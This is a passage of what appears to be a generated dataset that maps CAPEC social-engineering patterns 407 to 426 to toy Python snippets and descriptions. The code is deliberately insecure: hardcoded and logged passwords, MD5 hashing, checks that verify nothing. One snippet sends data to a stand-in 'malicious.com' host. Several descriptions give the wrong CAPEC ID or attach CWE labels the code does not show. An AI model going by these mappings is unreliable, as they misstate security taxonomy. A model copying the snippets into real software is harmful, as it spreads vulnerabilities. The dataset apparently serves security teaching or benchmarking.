        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import requests\n\nclass PretextingAttack:\n    def __init__(self, target_url, session_id):\n        self.target_url = target_url\n        self.session_id = session_id\n\n    def perform_attack(self):\n        # CWE-300: Channel Accessible by Non-Endpoint\n        headers = {'Authorization': f'Session {self.session_id}'}\n        response = requests.get(self.target_url, headers=headers)\n        \n        if response.status_code == 200:\n            # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            sensitive_info = response.text\n            print(f'Sensitive Information: {sensitive_info}')\n        else:\n            print('Failed to retrieve information')\n\n# Example usage\nattack = PretextingAttack('https://example.com/userinfo', 'fake-session-id')\nattack.perform_attack()",
        "description": "This Python code snippet demonstrates a simplified version of a pretexting attack. The `PretextingAttack` class is initialized with a target URL and a session ID. The `perform_attack` method attempts to access sensitive information from the target URL using the provided session ID. This embodies the main idea of CAPEC-172 (Pretexting) by simulating an attacker assuming a false identity (using a fake session ID) to solicit information. The code also incorporates CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the identity of the actor at the endpoint, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive information to an unauthorized actor."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import logging\nimport os\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulate storing sensitive data without encryption\nsensitive_data = 'user_password=12345'\n\n# Log sensitive data (CWE-532)\nlogging.debug(f'Storing sensitive data: {sensitive_data}')\n\n# Simulate a DNS lookup for a security decision (CWE-350)\ndef is_trusted_domain(domain):\n    trusted_domains = ['trusted.com']\n    return domain in trusted_domains\n\n# Example usage\nif is_trusted_domain('example.com'):\n    logging.debug('Domain is trusted')\nelse:\n    logging.debug('Domain is not trusted')",
        "description": "This Python code snippet demonstrates several deprecated weaknesses related to information exposure and improper security decisions. It configures logging to write to a file (potentially exposing sensitive information through log files, CWE-532). It also simulates storing sensitive data without encryption, which could lead to information exposure. Additionally, it includes a function that makes a security decision based on a DNS lookup (CWE-350), which is not a reliable method for ensuring security. The code embodies the main idea of the deprecated CAPEC by showing how traditional methods of information gathering and storage can lead to vulnerabilities."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import logging\nimport os\n\n# Configure logging to write to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate storing sensitive data without encryption\nsensitive_data = 'user_password=12345'\n\n# Log sensitive data (CWE-532)\nlogging.debug(f'Storing sensitive data: {sensitive_data}')\n\n# Simulate a DNS lookup for a security decision (CWE-350)\ndef is_trusted_domain(domain):\n    trusted_domains = ['trusted.com']\n    return domain in trusted_domains\n\n# Example usage\nif is_trusted_domain('example.com'):\n    print('Domain is trusted')\nelse:\n    print('Domain is not trusted')",
        "description": "This Python code snippet demonstrates deprecated and vulnerable practices related to the CAPEC and CWEs mentioned. The code logs sensitive data to a debug log file (CWE-532), which can lead to information exposure. Additionally, it makes a security decision based on a DNS lookup (CWE-350), which is unreliable and can be exploited. The code highlights the importance of avoiding such deprecated practices to ensure better security."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\ndef handle_client(client_socket):\n    # CWE-205: Observable Behavioral Discrepancy\n    client_socket.send(b'Welcome to the secure server. Please provide your credentials.')\n    credentials = client_socket.recv(1024).decode('utf-8')\n    \n    # CWE-222: Truncation of Security-relevant Information\n    if len(credentials) > 50:\n        credentials = credentials[:50]\n    \n    # Simulate credential verification (vulnerable to CWE-940)\n    if credentials == 'admin:password123':\n        client_socket.send(b'Access granted. Here is the sensitive information: [Sensitive Data]')\n    else:\n        client_socket.send(b'Access denied.')\n    \n    client_socket.close()\n\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.bind(('0.0.0.0', 9999))\nserver.listen(5)\n\nprint('Server listening on port 9999...')\n\nwhile True:\n    client_socket, addr = server.accept()\n    handle_client(client_socket)",
        "description": "This Python code snippet demonstrates a simple server that handles client connections and requests credentials. It embodies the main idea of CAPEC-118 (Information Elicitation) by simulating a scenario where an adversary could extract sensitive information through social engineering. The code includes several vulnerabilities: CWE-940 (Improper Verification of Source of a Communication Channel) by not verifying the source of the credentials, CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing sensitive data, CWE-205 (Observable Behavioral Discrepancy) by sending different responses based on credentials, and CWE-222 (Truncation of Security-relevant Information) by truncating the credentials if they are too long. This setup can be exploited by an attacker to gather sensitive information from the server."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import logging\n\n# Setup logging to a file\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Simulate sensitive information\nuser_password = 'SuperSecretPassword123'\n\n# Log sensitive information (vulnerable practice)\nlogging.debug(f'User password: {user_password}')\n\n# Simulate an authentication check\ndef authenticate(user_input):\n    if user_input == user_password:\n        return 'Access Granted'\n    else:\n        return 'Access Denied'\n\n# Example usage\nuser_input = 'SuperSecretPassword123'\nprint(authenticate(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable practice related to the deprecated CAPEC-407: Social Information Gathering via Pretexting, and the related CWEs, particularly CWE-532 (Information Exposure Through Log Files). The code sets up logging to a file and logs sensitive information (a user's password), which is a bad practice as it exposes sensitive data in log files. Additionally, it includes a simple authentication function that checks the user input against the logged password. This example highlights the risk of exposing sensitive information through log files, which can be exploited by attackers for social engineering or other malicious activities."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import random\n\nclass CustomerService:\n    def __init__(self):\n        self.customers = {\n            '1234': {'name': 'Alice', 'credit_card': '4111-1111-1111-1111'},\n            '5678': {'name': 'Bob', 'credit_card': '4222-2222-2222-2222'}\n        }\n\n    def verify_customer(self, customer_id):\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        # CWE-300: Channel Accessible by Non-Endpoint\n        if customer_id in self.customers:\n            return True\n        return False\n\n    def get_credit_card_info(self, customer_id):\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if self.verify_customer(customer_id):\n            return self.customers[customer_id]['credit_card']\n        return 'Unauthorized access'\n\n# Simulating an adversary pretexting as customer service\nclass Adversary:\n    def __init__(self, customer_service):\n        self.customer_service = customer_service\n\n    def pretext_call(self, target_customer_id):\n        # CWE-408: Incorrect Behavior Order: Early Amplification\n        # CWE-925: Improper Verification of Intent by Broadcast Receiver\n        print(f\"Calling customer service pretending to be customer {target_customer_id}...\")\n        credit_card_info = self.customer_service.get_credit_card_info(target_customer_id)\n        print(f\"Obtained credit card info: {credit_card_info}\")\n\n# Example usage\ncustomer_service = CustomerService()\nadversary = Adversary(customer_service)\nadversary.pretext_call('1234')",
        "description": "This Python code snippet demonstrates a scenario where an adversary engages in pretexting behavior by pretending to be a customer service representative to solicit sensitive information. The `CustomerService` class contains customer data and methods to verify customers and retrieve credit card information. The `Adversary` class simulates an attacker who calls the customer service, pretending to be a legitimate customer, and attempts to retrieve credit card information. The code highlights several vulnerabilities: improper verification of the source of a communication channel (CWE-940), exposure of sensitive information to an unauthorized actor (CWE-200), and incorrect behavior order (CWE-408). The adversary successfully obtains sensitive information due to these weaknesses."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-1263: Improper Physical Access Control\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\ndef handle_tech_support_request(user_input):\n    # Simulate a tech support request handling\n    if 'password' in user_input.lower():\n        # CWE-200: Exposing sensitive information\n        print('Your password is: 12345')\n\n    # CWE-434: Allowing dangerous file upload\n    if 'upload' in user_input.lower():\n        file_path = '/tmp/uploaded_file.txt'\n        with open(file_path, 'w') as f:\n            f.write('This is a dangerous file.')\n        print(f'File uploaded to {file_path}')\n\n    # CWE-538: Inserting sensitive information into an externally accessible file\n    sensitive_info = 'User: admin, Password: 12345'\n    with open('/tmp/public_info.txt', 'w') as f:\n        f.write(sensitive_info)\n    print('Sensitive information written to /tmp/public_info.txt')\n\n# Simulate a tech support interaction\nuser_input = input('Enter your tech support request: ')\nhandle_tech_support_request(user_input)\n\n# CWE-1263: Improper physical access control\n# Simulate physical access by writing to a sensitive file\nwith open('/etc/sensitive_config', 'w') as f:\n    f.write('Sensitive configuration data')\nprint('Sensitive configuration data written to /etc/sensitive_config')",
        "description": "This Python code snippet simulates a scenario where an adversary, posing as a tech support worker, exploits various vulnerabilities to gain unauthorized access to sensitive information and perform malicious actions. The code demonstrates the following vulnerabilities:\n\n1. CWE-200: Exposing sensitive information (e.g., passwords) to unauthorized actors.\n2. CWE-359: Exposing private personal information to unauthorized actors.\n3. CWE-434: Allowing the upload of dangerous files without proper validation.\n4. CWE-538: Inserting sensitive information into an externally accessible file or directory.\n5. CWE-1263: Improper physical access control, allowing unauthorized physical access to sensitive files.\n\nThe code represents the main idea of the CAPEC by showing how an adversary can manipulate a tech support interaction to compromise a system's security."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import os\nimport socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\n# Simulate a delivery person pretexting attack\nclass DeliveryPersonPretexting:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n        self.sensitive_info = \"Sensitive Information: User credentials\"\n\n    def create_communication_channel(self):\n        try:\n            # Incorrectly specifying the destination (CWE-941)\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.connect((self.target_ip, self.target_port))\n            print(\"Connected to target.\")\n        except Exception as e:\n            print(f\"Failed to connect: {e}\")\n\n    def deliver_payload(self):\n        try:\n            # Inserting sensitive information into an externally-accessible file (CWE-538)\n            with open(\"/tmp/delivery_payload.txt\", \"w\") as f:\n                f.write(self.sensitive_info)\n            print(\"Payload delivered.\")\n        except Exception as e:\n            print(f\"Failed to deliver payload: {e}\")\n\n    def execute_attack(self):\n        self.create_communication_channel()\n        self.deliver_payload()\n\n# Example usage\nattacker = DeliveryPersonPretexting(\"192.168.1.10\", 8080)\nattacker.execute_attack()",
        "description": "This Python code snippet simulates a pretexting attack where an adversary impersonates a delivery person to solicit information or manipulate the target. The `DeliveryPersonPretexting` class embodies the main idea of CAPEC-Pretexting via Delivery Person. The `create_communication_channel` method demonstrates CWE-941 by incorrectly specifying the destination for the communication channel. The `deliver_payload` method demonstrates CWE-538 by inserting sensitive information into an externally-accessible file. The `execute_attack` method orchestrates the attack by creating the communication channel and delivering the payload. This code highlights the vulnerabilities and potential exploitation methods described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import random\n\nclass PhoneSystem:\n    def __init__(self):\n        self.employees = {'Alice': 'IT', 'Bob': 'HR', 'Charlie': 'Finance'}\n        self.sensitive_info = {'Alice': 'Password123', 'Bob': 'HRFiles', 'Charlie': 'FinanceReport'}\n\n    def verify_caller(self, caller_id):\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        return caller_id in self.employees\n\n    def handle_call(self, caller_id, request):\n        if not self.verify_caller(caller_id):\n            print(\"Caller verification failed.\")\n            return\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        if request == 'get_info':\n            print(f\"Sensitive info: {self.sensitive_info[caller_id]}\")\n        else:\n            print(\"Request not recognized.\")\n\n# Simulating a pretexting attack\nphone_system = PhoneSystem()\n# An adversary impersonates 'Alice' to get sensitive information\nadversary_id = 'Alice'\nphone_system.handle_call(adversary_id, 'get_info')",
        "description": "This Python code snippet simulates a phone system where an adversary can perform a pretexting attack by impersonating a trusted employee to solicit sensitive information. The `PhoneSystem` class contains a list of employees and their sensitive information. The `verify_caller` method checks if the caller ID is in the list of employees, but it does not adequately verify the identity of the caller (CWE-940). The `handle_call` method exposes sensitive information if the caller ID is verified, demonstrating CWE-200. This code represents the main idea of CAPEC-Pretexting via Phone, where an adversary manipulates the target into revealing sensitive information by assuming a trusted role."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import time\n\nclass HelpDesk:\n    def __init__(self):\n        self.sensitive_info = 'User: JohnDoe, Password: 12345'\n        self.request_count = 0\n\n    def handle_request(self, request):\n        self.request_count += 1\n        if self.request_count > 5:\n            print('Too many requests. Please try again later.')\n            return\n        if 'supervisor' in request:\n            print('Access granted. Sensitive info:', self.sensitive_info)\n        else:\n            print('Access denied.')\n\n# Simulating social engineering attack\nhelp_desk = HelpDesk()\nrequests = ['I am a supervisor, please provide the info.',\n            'I am a supervisor, please provide the info.',\n            'I am a supervisor, please provide the info.',\n            'I am a supervisor, please provide the info.',\n            'I am a supervisor, please provide the info.',\n            'I am a supervisor, please provide the info.']\n\nfor req in requests:\n    help_desk.handle_request(req)\n    time.sleep(1)",
        "description": "This Python code snippet simulates a help desk system that can be exploited through social engineering. The HelpDesk class contains sensitive information and a method to handle requests. The handle_request method checks if the request count exceeds a limit (CWE-799: Improper Control of Interaction Frequency) and grants access if the request contains the word 'supervisor' (CAPEC: Manipulate Human Behavior). This demonstrates how an attacker can manipulate human behavior to gain unauthorized access to sensitive information (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). The repeated requests simulate an attacker trying to exploit the system by pretending to be a supervisor."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import hashlib\n\n# Simulate a simple authentication mechanism\nclass AuthSystem:\n    def __init__(self):\n        self.users = {'admin': '5f4dcc3b5aa765d61d8327deb882cf99'}  # 'password' hashed with MD5\n\n    def authenticate(self, username, password):\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if username in self.users and self.users[username] == hashed_password:\n            return True\n        return False\n\n# Simulate a social engineering attack\nclass SocialEngineer:\n    def __init__(self, auth_system):\n        self.auth_system = auth_system\n\n    def influence_perception(self, target_username):\n        # Pretend to be a trusted entity and ask for the password\n        print(f\"Hi {target_username}, this is IT support. We need your password to fix an issue.\")\n        password = input(\"Please enter your password: \")\n        if self.auth_system.authenticate(target_username, password):\n            print(\"Access granted.\")\n        else:\n            print(\"Access denied.\")\n\n# Main execution\nif __name__ == '__main__':\n    auth_system = AuthSystem()\n    social_engineer = SocialEngineer(auth_system)\n    social_engineer.influence_perception('admin')",
        "description": "This Python code snippet demonstrates a simple authentication system and a social engineering attack that exploits the target's perception. The AuthSystem class uses a single-factor authentication mechanism (CWE-654) with MD5 hashing, which is a weak and easily reversible hash function. The SocialEngineer class simulates a social engineering attack by pretending to be IT support and asking the user for their password. This attack leverages the user's trust and perception (CAPEC: Influence Perception) to gain unauthorized access. The code also highlights the reliance on security through obscurity (CWE-656) and the potential for observable behavioral discrepancies (CWE-205) in the authentication process."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-222: Truncation of Security-relevant Information\n\ndef create_socket_connection(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        return s\n    except Exception as e:\n        print(f\"Connection error: {str(e)[:10]}\")  # CWE-222: Truncation of Security-relevant Information\n        return None\n\n# Simulate a social engineering attack\n# CWE-940: No verification of the source\n# CWE-941: Incorrectly specified destination\n# CWE-300: Channel accessible by non-endpoint\n# CWE-301: Reflection attack\n\ndef social_engineering_attack(target_host, target_port):\n    s = create_socket_connection(target_host, target_port)\n    if s:\n        try:\n            # CWE-940: No verification of the source\n            s.send(b\"Hello, you are doing a great job! Can you tell me your password?\")\n            response = s.recv(1024)\n            print(f\"Received: {response}\")\n        except Exception as e:\n            print(f\"Communication error: {str(e)[:10]}\")  # CWE-222: Truncation of Security-relevant Information\n        finally:\n            s.close()\n\n# Example usage\nsocial_engineering_attack('example.com', 80)",
        "description": "This Python code snippet demonstrates a basic example of a social engineering attack that leverages multiple CWEs. The `create_socket_connection` function attempts to establish a socket connection to a specified host and port, but it truncates error messages (CWE-222). The `social_engineering_attack` function simulates a social engineering attack by sending a message that compliments the target and asks for sensitive information without verifying the source (CWE-940) or ensuring the correct destination (CWE-941). The communication channel is accessible by non-endpoints (CWE-300), and the code is vulnerable to reflection attacks (CWE-301). This snippet embodies the main idea of the CAPEC by using social engineering to influence the target to reveal sensitive information."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation\n# CWE-203: Observable Discrepancy\n\n# Simulate a negotiation process for selecting an encryption algorithm\navailable_algorithms = ['AES-256', 'AES-128', 'DES']\n\n# An attacker can influence the selection to use a less secure algorithm\nselected_algorithm = 'DES' if 'DES' in available_algorithms else available_algorithms[0]\n\n# Simulate an observable discrepancy based on the selected algorithm\nif selected_algorithm == 'DES':\n    print(\"Warning: Using a less secure algorithm (DES)\")\n\n# Simulate a communication with an incorrectly specified destination\nurl = \"http://example.com/api\"\nincorrect_url = \"http://malicious.com/api\"\n\n# An attacker can observe the discrepancy in the destination URL\nresponse = requests.post(incorrect_url, data={'algorithm': selected_algorithm})\n\nprint(f\"Response from {incorrect_url}: {response.status_code}\")",
        "description": "This Python code snippet demonstrates a scenario where an attacker can influence the selection of a less secure algorithm (CWE-757) during a negotiation process. The code also includes an observable discrepancy (CWE-203) by printing a warning when a less secure algorithm is selected. Additionally, it shows an incorrectly specified destination in a communication channel (CWE-941) by sending a request to a malicious URL. This embodies the deprecated CAPEC pattern of 'Target Influence via Perception of Concession' by allowing an attacker to influence the system's behavior and observe discrepancies that reveal security-relevant information."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import time\nimport random\n\n# Simulate a perception of scarcity\nclass ScarcityInfluence:\n    def __init__(self):\n        self.items = ['item1', 'item2', 'item3']\n        self.stock = {item: random.randint(1, 5) for item in self.items}\n\n    def display_items(self):\n        for item, count in self.stock.items():\n            print(f'{item}: {count} left')\n\n    def purchase_item(self, item):\n        if self.stock[item] > 0:\n            self.stock[item] -= 1\n            print(f'Purchased {item}. {self.stock[item]} left.')\n        else:\n            print(f'{item} is out of stock!')\n\n# Simulate a user decision influenced by perceived scarcity\nscarcity = ScarcityInfluence()\nscarcity.display_items()\n\n# User is influenced to make a quick decision\nuser_choice = 'item1'\nscarcity.purchase_item(user_choice)\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# Here, the decision to purchase is based solely on the perceived scarcity\nif scarcity.stock[user_choice] == 0:\n    print('Hurry! Last item purchased!')\n\n# CWE-405: Asymmetric Resource Consumption\n# Simulate a situation where checking stock consumes resources\nfor _ in range(1000):\n    scarcity.display_items()\n    time.sleep(0.01)\n\n# CWE-656: Reliance on Security Through Obscurity\n# The stock levels are not protected and can be easily manipulated\nscarcity.stock['item1'] = 100\nprint('Stock levels manipulated!')\nscarcity.display_items()\n\n# CWE-222: Truncation of Security-relevant Information\n# Truncate stock display to create urgency\nfor item, count in scarcity.stock.items():\n    print(f'{item}: {str(count)[:1]} left')\n\n# CWE-205: Observable Behavioral Discrepancy\n# Different behavior when stock is low vs high\nif scarcity.stock['item1'] < 2:\n    print('Low stock warning!')\nelse:\n    print('Stock is sufficient.')",
        "description": "This Python code snippet simulates a scenario where an adversary leverages the perception of scarcity to influence a user's decision-making process. The `ScarcityInfluence` class initializes a stock of items with random quantities and provides methods to display and purchase items. The code demonstrates several related CWEs:\n\n1. **CWE-654: Reliance on a Single Factor in a Security Decision** - The decision to purchase is based solely on the perceived scarcity of the item.\n2. **CWE-405: Asymmetric Resource Consumption** - The code simulates a situation where repeatedly checking stock levels consumes resources.\n3. **CWE-656: Reliance on Security Through Obscurity** - The stock levels are not protected and can be easily manipulated.\n4. **CWE-222: Truncation of Security-relevant Information** - The stock display is truncated to create a sense of urgency.\n5. **CWE-205: Observable Behavioral Discrepancy** - The code exhibits different behaviors when stock levels are low versus high, which can be observed by unauthorized actors."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef impersonate_authority(target_ip, target_port):\n    try:\n        # Create a socket connection to the target\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((target_ip, target_port))\n\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # Send a message impersonating an authority figure\n        authority_message = \"ADMIN: Please provide your credentials for verification.\"\n        s.sendall(authority_message.encode('utf-8'))\n\n        # Receive the response from the target\n        response = s.recv(1024)\n        print(f\"Received: {response.decode('utf-8')}\")\n\n        s.close()\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n# Example usage\nimpersonate_authority('192.168.1.10', 8080)",
        "description": "This Python code snippet demonstrates a simple example of an adversary using a social engineering technique to convey a sense of authority, which aligns with the CAPEC 'Influence Perception of Authority'. The code attempts to impersonate an authority figure by sending a message to a target machine, requesting sensitive information. The code leverages CWE-300 (Channel Accessible by Non-Endpoint) and CWE-940 (Improper Verification of Source of a Communication Channel) by establishing a communication channel without proper verification of the source. It also relies on CWE-654 (Reliance on a Single Factor in a Security Decision) by assuming that the target will trust the message based on the perceived authority of the sender. This example highlights the vulnerability of systems that do not adequately verify the identity of communication sources and rely on single-factor authentication."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import requests\n\nclass SocialEngineer:\n    def __init__(self, target_url):\n        self.target_url = target_url\n        self.session = requests.Session()\n\n    def minor_request(self):\n        response = self.session.get(f'{self.target_url}/minor_task')\n        if response.status_code == 200:\n            print('Minor task completed.')\n            return True\n        return False\n\n    def major_request(self):\n        response = self.session.get(f'{self.target_url}/major_task')\n        if response.status_code == 200:\n            print('Major task completed.')\n            return True\n        return False\n\n    def execute(self):\n        if self.minor_request():\n            self.major_request()\n\n# Example usage\nengineer = SocialEngineer('http://example.com')\nengineer.execute()",
        "description": "This Python code snippet demonstrates a simplified version of the 'Influence Perception of Commitment and Consistency' attack pattern. The SocialEngineer class simulates an adversary who first makes a minor request to a target URL. If the minor request is successful, the adversary then makes a major request. This sequence leverages the psychological principle that individuals are more likely to comply with larger requests after agreeing to smaller ones. The code also touches on related CWEs: it does not limit the frequency of interactions (CWE-799), and it does not verify the source of the communication channel (CWE-940). Additionally, the responses to the requests could reveal discrepancies (CWE-203) that an attacker could exploit."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import hashlib\n\nclass AuthenticationSystem:\n    def __init__(self):\n        self.users = {'trusted_user': '5f4dcc3b5aa765d61d8327deb882cf99'}  # md5 for 'password'\n        self.session_tokens = {}\n\n    def authenticate(self, username, password):\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if username in self.users and self.users[username] == hashed_password:\n            token = self.generate_token(username)\n            self.session_tokens[username] = token\n            return token\n        return None\n\n    def generate_token(self, username):\n        return hashlib.md5(username.encode()).hexdigest()\n\n    def access_resource(self, token):\n        for user, user_token in self.session_tokens.items():\n            if user_token == token:\n                return f\"Access granted to {user}\"\n        return \"Access denied\"\n\n# Adversary builds a relationship and gets the password\nadversary = AuthenticationSystem()\nadversary_token = adversary.authenticate('trusted_user', 'password')\n\n# Adversary uses the token to access resources\nprint(adversary.access_resource(adversary_token))",
        "description": "This Python code snippet demonstrates an authentication system that is vulnerable to several weaknesses described in the CAPEC and related CWEs. The system uses a simple username-password authentication mechanism and generates session tokens based on the username. The adversary, by building a relationship and gaining the trust of the user, obtains the user's password ('Influence Perception of Liking'). The system relies on a single factor (password) for authentication (CWE-654) and uses MD5 hashing, which is not secure. The session tokens are also generated using MD5 based on the username, making the system vulnerable to attacks if the algorithm is known (CWE-656). The adversary can then use the obtained password to authenticate and access restricted resources, demonstrating the potential impact of these weaknesses."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import random\n\nclass VotingSystem:\n    def __init__(self):\n        self.votes = {'A': 0, 'B': 0}\n        self.user_votes = {}\n\n    def vote(self, user, choice):\n        if user in self.user_votes:\n            print(\"User has already voted.\")\n            return\n        if choice not in self.votes:\n            print(\"Invalid choice.\")\n            return\n        self.user_votes[user] = choice\n        self.votes[choice] += 1\n        self.display_votes()\n\n    def display_votes(self):\n        # Simulate observable discrepancy by showing partial results\n        if random.random() > 0.5:\n            print(f\"Current votes: {self.votes}\")\n        else:\n            print(\"Votes are being counted...\")\n\n# Example usage\nvoting_system = VotingSystem()\nvoting_system.vote('user1', 'A')\nvoting_system.vote('user2', 'B')\nvoting_system.vote('user3', 'A')\nvoting_system.vote('user1', 'B')  # User has already voted\nvoting_system.vote('user4', 'C')  # Invalid choice",
        "description": "This Python code snippet represents a simple voting system that embodies the CAPEC 'Influence Perception of Consensus or Social Proof'. The system allows users to vote for choices 'A' or 'B'. The 'display_votes' method simulates an observable discrepancy (CWE-203) by randomly deciding whether to show the current vote counts or a generic message. This can influence users' perception of the consensus, potentially affecting their voting behavior. Additionally, the system checks if a user has already voted (CWE-205) and handles invalid choices. The randomness in displaying votes can create a perception of consensus that may not be accurate, leveraging the human tendency to follow perceived majority behavior."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import requests\n\nclass FramingInfluence:\n    def __init__(self, base_url):\n        self.base_url = base_url\n\n    def send_request(self, endpoint, data):\n        # CWE-941: Incorrectly Specified Destination in a Communication Channel\n        url = f'{self.base_url}/{endpoint}'\n        response = requests.post(url, json=data)\n        return response.json()\n\n    def influence_target(self, target_data):\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        if 'auth_token' in target_data:\n            # CWE-451: UI Misrepresentation of Critical Information\n            print(\"Access granted. Welcome!\")\n            # CWE-757: Selection of Less-Secure Algorithm During Negotiation\n            target_data['algorithm'] = 'MD5'\n            # CWE-300: Channel Accessible by Non-Endpoint\n            response = self.send_request('influence', target_data)\n            return response\n        else:\n            print(\"Access denied. Please provide valid credentials.\")\n            return None\n\n# Example usage\nframing = FramingInfluence('http://example.com')\ntarget_data = {'auth_token': 'valid_token', 'info': 'sensitive_data'}\nresponse = framing.influence_target(target_data)\nprint(response)",
        "description": "This Python code snippet demonstrates a class `FramingInfluence` that embodies the concept of 'Target Influence via Framing' by manipulating the target's data and communication. The `send_request` method constructs a URL and sends a POST request, potentially to an incorrect destination (CWE-941). The `influence_target` method checks for a single factor (auth_token) to grant access (CWE-654) and misrepresents critical information by always printing 'Access granted' (CWE-451). It also selects a less secure algorithm (MD5) during negotiation (CWE-757) and sends data over a potentially insecure channel (CWE-300). This code illustrates how framing techniques can be used to influence a target's actions and decisions by exploiting various security weaknesses."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import random\n\nclass User:\n    def __init__(self, username, balance):\n        self.username = username\n        self.balance = balance\n\n    def transfer(self, amount, recipient):\n        if self.balance >= amount:\n            self.balance -= amount\n            recipient.balance += amount\n            print(f\"Transferred {amount} to {recipient.username}\")\n        else:\n            print(\"Insufficient balance\")\n\nclass Adversary:\n    def __init__(self, target):\n        self.target = target\n\n    def incentivize(self):\n        # Influence via Incentives\n        if random.choice([True, False]):\n            print(f\"{self.target.username} is incentivized to transfer money.\")\n            self.target.transfer(10, User('Adversary', 0))\n        else:\n            print(f\"{self.target.username} is not incentivized.\")\n\n# Example usage\nuser = User('victim', 100)\nadversary = Adversary(user)\nadversary.incentivize()",
        "description": "This Python code snippet demonstrates the concept of 'Influence via Incentives' by simulating an adversary who attempts to incentivize a user to transfer money. The `User` class represents a user with a balance, and the `Adversary` class represents an attacker targeting the user. The `incentivize` method in the `Adversary` class randomly decides whether to incentivize the user to transfer money to the adversary. This embodies the CAPEC idea of manipulating a target's behavior through incentives. The code also indirectly touches on related CWEs, such as the potential for asymmetric resource consumption (CWE-405) if the adversary can repeatedly incentivize the user without equivalent effort, and reliance on a single factor (CWE-654) in the decision to transfer money."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
